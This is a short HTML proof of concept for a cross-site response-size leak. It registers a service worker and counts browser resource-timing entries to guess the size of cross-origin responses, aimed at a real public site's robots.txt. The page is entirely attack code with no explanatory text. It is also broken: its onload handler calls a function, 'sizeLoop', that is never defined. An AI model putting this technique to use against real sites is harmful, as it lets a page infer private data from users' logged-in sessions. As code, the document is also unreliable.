<html>
	<head>
		<title>Response size leak</title>
		<script>
			if ("serviceWorker" in navigator) {
				addEventListener("load", async () => {
					performance.setResourceTimingBufferSize(1337);
					const registration = await navigator.serviceWorker.register("serviceworker.js");
					if (registration.installing)
						location.reload();
				});
			}

			singleSizeCheck =  async (url, size) => {
				let start   = performance.getEntries().length;
				let sound   = document.createElement("audio");
				sound.src = `${url}?size=${size}&${Math.random()}`;
				return new Promise((resolve) => {
					sound.onerror = () => {
						let end = performance.getEntries().length;
						if (end - start == 2)
							return resolve(true);
						else
							return resolve(false);
					}
				});
			}

			sizeCheck = async (url, size) => {
				let tries = 10;
				return new Promise(async (resolve) => {
					while (tries) {
						let status = await singleSizeCheck(url, size);
						if (status) {
              console.log(true);
							return resolve(true);
            }
						tries--;
					}
          console.log(false);
					return resolve(false);
				});
			}

			
			onload = () => {
				sizeLoop("https://www.baidu.com/robots.txt", 2970);
			}
	</script>
</head>

<body>
</body>

</html>
